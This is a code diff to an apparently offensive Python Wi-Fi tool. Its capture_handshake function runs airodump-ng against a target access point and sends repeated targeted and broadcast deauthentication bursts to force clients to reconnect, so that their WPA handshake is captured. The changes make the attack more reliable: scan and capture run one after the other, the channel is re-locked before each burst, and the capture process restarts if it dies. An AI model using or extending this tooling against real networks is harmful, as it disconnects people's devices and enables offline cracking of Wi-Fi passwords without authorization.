@@ -683,14 +683,18 @@ def capture_handshake(
             print('  [!] Channel lock unverified — proceeding')
 
         # ══════════════════════════════════════════════════════════════════
-        # Phase 1: Client discovery + early handshake detection
+        # Phase 1: Client discovery — scan only, no concurrent capture.
+        #
+        # Running two airodump-ng processes on the same monitor interface
+        # simultaneously causes silent conflicts on most drivers (the second
+        # process either fails to open the device or gets starved of frames).
+        # We scan first, kill the scan, then launch the dedicated capture
+        # process alone so it has exclusive access to the interface.
         # ══════════════════════════════════════════════════════════════════
         scan_duration = max(10, int(phase1_end - time.time()))
         print(f'  [*] Phase 1: scanning for clients ({scan_duration}s)...')
         logger.info("Phase 1: client scan (%ds)", scan_duration)
 
-        # Scan WITHOUT --bssid filter — sees ALL stations on channel
-        # No --write-interval (airgeddon doesn't use it; avoids CSV corruption)
         scan_proc = _popen([
             'airodump-ng',
             '-c', str(channel),
@@ -699,29 +703,8 @@ def capture_handshake(
         ])
         child_procs.append(scan_proc)
 
-        # Wait for scan, but also start capture airodump early to catch
-        # handshakes that arrive during the scan phase
-        _rm(cap_prefix)
-        airodump_proc = _popen([
-            'airodump-ng',
-            '-c', str(channel),
-            '-d', bssid.upper(),
-            '-w', cap_prefix,
-            iface,
-        ])
-        child_procs.append(airodump_proc)
-
-        # Wait for scan to complete
         while time.time() < phase1_end and time.time() < absolute_deadline:
             time.sleep(1)
-            # Check for early handshake during scan
-            cap = _find_cap(cap_prefix)
-            if cap and _verify(cap, bssid, tmpdir):
-                print('  [+] Handshake captured during scan phase!')
-                logger.info("Handshake found during Phase 1 scan!")
-                _kill(scan_proc)
-                _kill(airodump_proc)
-                return _save(cap, bssid)
 
         _kill(scan_proc)
         scan_proc = None
@@ -743,15 +726,27 @@ def capture_handshake(
 
         top_clients = clients[:5]  # target top-5 by signal strength
 
-        # ── Adaptive airodump startup verification ────────────────────────
-        # Wait for cap file to actually appear (some adapters are slow)
+        # ── Launch dedicated capture airodump (sole user of the interface) ──
+        _rm(cap_prefix)
+        print(f'  [*] Starting capture on channel {channel} ({bssid})...')
+        airodump_proc = _popen([
+            'airodump-ng',
+            '-c', str(channel),
+            '-d', bssid.upper(),
+            '-w', cap_prefix,
+            iface,
+        ])
+        child_procs.append(airodump_proc)
+
+        # Wait for the cap file to appear (some adapters take a moment)
         cap_wait_start = time.time()
         while time.time() - cap_wait_start < 10:
             if _find_cap(cap_prefix):
+                logger.debug("Cap file ready after %.1fs", time.time() - cap_wait_start)
                 break
             if not _is_alive(airodump_proc):
-                logger.error("airodump-ng died during startup!")
-                print('  [!] airodump-ng failed to start — restarting...')
+                logger.error("airodump-ng failed to start!")
+                print('  [!] airodump-ng failed to start — retrying...')
                 airodump_proc = _popen([
                     'airodump-ng',
                     '-c', str(channel),
@@ -762,9 +757,11 @@ def capture_handshake(
                 child_procs.append(airodump_proc)
             time.sleep(0.5)
 
-        if not _find_cap(cap_prefix):
-            logger.warning("Cap file not created after 10s wait")
-            print('  [!] Warning: cap file not yet created')
+        if _find_cap(cap_prefix):
+            print(f'  [+] Capture file open — ready to record handshake.')
+        else:
+            logger.warning("Cap file not created after 10s — proceeding anyway")
+            print('  [!] Warning: cap file not yet visible — adapter may be slow')
 
         # ══════════════════════════════════════════════════════════════════
         # Phase 2: Targeted deauth — burst-and-wait (allows reassociation)
@@ -790,10 +787,18 @@ def capture_handshake(
         while time.time() < phase2_end and time.time() < absolute_deadline:
             burst_num += 1
             elapsed = int(time.time() - start_time)
+
+            # Re-lock channel before each burst — some adapters drift after TX
+            if not _set_channel(iface, channel):
+                logger.warning("Channel re-lock failed before burst #%d", burst_num)
+
             print(f'  [*] Burst #{burst_num} [{elapsed}s] — sending {deauth_count} deauth frames...',
                   end=' ', flush=True)
             _deauth_burst_parallel(iface, bssid, target_macs, deauth_count)
             print('done.')
+
+            # Brief settle: let the RX path recover from TX before we listen
+            time.sleep(0.5)
 
             # Health: check airodump is alive
             if not _is_alive(airodump_proc):
@@ -808,13 +813,23 @@ def capture_handshake(
                 ])
                 child_procs.append(airodump_proc)
 
-            # Reassociation window — poll every second for the full window
-            # Client needs silence to reconnect; handshake is captured on reassoc.
+            # Reassociation window — stay silent for the full window so the
+            # client can reconnect and complete the 4-way handshake.
             reassoc_end = min(time.time() + REASSOC_WAIT, phase2_end, absolute_deadline)
             while time.time() < reassoc_end:
                 remaining = int(reassoc_end - time.time())
-                print(f'\r  [*] Reassoc window: {remaining:2d}s remaining...  ', end='', flush=True)
+                cap_kb = _cap_size(cap_prefix) // 1024
+                print(f'\r  [*] Reassoc window: {remaining:2d}s  cap: {cap_kb}KB      ',
+                      end='', flush=True)
                 time.sleep(1)
+                # Restart airodump if it died mid-window
+                if not _is_alive(airodump_proc):
+                    logger.error("airodump-ng died during reassoc window!")
+                    airodump_proc = _popen([
+                        'airodump-ng', '-c', str(channel),
+                        '-d', bssid.upper(), '-w', cap_prefix, iface,
+                    ])
+                    child_procs.append(airodump_proc)
                 cap = _find_cap(cap_prefix)
                 if cap and _verify(cap, bssid, tmpdir):
                     elapsed = int(time.time() - start_time)
@@ -836,10 +851,16 @@ def capture_handshake(
             while time.time() < phase3_end and time.time() < absolute_deadline:
                 burst_num += 1
                 elapsed = int(time.time() - start_time)
+
+                if not _set_channel(iface, channel):
+                    logger.warning("Channel re-lock failed before broadcast burst #%d", burst_num)
+
                 print(f'  [*] Broadcast burst #{burst_num} [{elapsed}s] — sending {deauth_count} frames...',
                       end=' ', flush=True)
                 _deauth_burst_parallel(iface, bssid, [], deauth_count)
                 print('done.')
+
+                time.sleep(0.5)
 
                 # Health: check airodump is alive
                 if not _is_alive(airodump_proc):
@@ -857,8 +878,17 @@ def capture_handshake(
                 reassoc_end = min(time.time() + REASSOC_WAIT, phase3_end, absolute_deadline)
                 while time.time() < reassoc_end:
                     remaining = int(reassoc_end - time.time())
-                    print(f'\r  [*] Reassoc window: {remaining:2d}s remaining...  ', end='', flush=True)
+                    cap_kb = _cap_size(cap_prefix) // 1024
+                    print(f'\r  [*] Reassoc window: {remaining:2d}s  cap: {cap_kb}KB      ',
+                          end='', flush=True)
                     time.sleep(1)
+                    if not _is_alive(airodump_proc):
+                        logger.error("airodump-ng died during reassoc window!")
+                        airodump_proc = _popen([
+                            'airodump-ng', '-c', str(channel),
+                            '-d', bssid.upper(), '-w', cap_prefix, iface,
+                        ])
+                        child_procs.append(airodump_proc)
                     cap = _find_cap(cap_prefix)
                     if cap and _verify(cap, bssid, tmpdir):
                         elapsed = int(time.time() - start_time)
